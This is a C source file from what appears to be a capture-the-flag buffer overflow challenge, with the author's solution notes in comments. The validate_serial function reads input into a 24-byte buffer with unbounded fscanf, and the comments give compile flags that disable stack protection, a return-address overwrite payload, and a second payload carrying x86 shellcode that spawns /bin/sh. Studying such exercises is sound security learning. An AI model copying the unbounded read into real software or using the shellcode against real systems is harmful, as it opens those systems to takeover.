#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int validate_serial(){
    char serial[24];
    fscanf( stdin, "%s", serial);
    return 0;
}

//how to get to this point if validate_serial always returns false?
int do_valid_stuff(){
    printf("Flag!\n");
}

int main( int argc, char *argv[]){
    if(validate_serial()){
        do_valid_stuff();
    }
    else{
        printf("Invalid serial number!\n");
    }
}

// gcc -mpreferred-stack-boundary=2 -ggdb -g -fno-stack-protector auth.c -o auth
// 0x804848b: validate serial
// \x8b\x84\x04\x08
// return address for the function 0x080484ca
// want to force the program to go to do_valid_stuff instead of the invalid stuff!
// AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xce\x84\x04\x08
// printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xce\x84\x04\x08" | ./auth is a working exploit

// printf "AAAAAAAAAAAAAAAAAAAAAAAAAAA\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x2f\x4a\x4a\x4a\x4a\x4b\x4b\x4b\x4b"

/*
What was needed in order to solve this challenge?
-Understanding of how stack and assembly works.
-gcc with specific flags
-gdb: x/20x $ebp, disas func, break *0xaddress, continue, run.
-printf in command line
-wc

*/
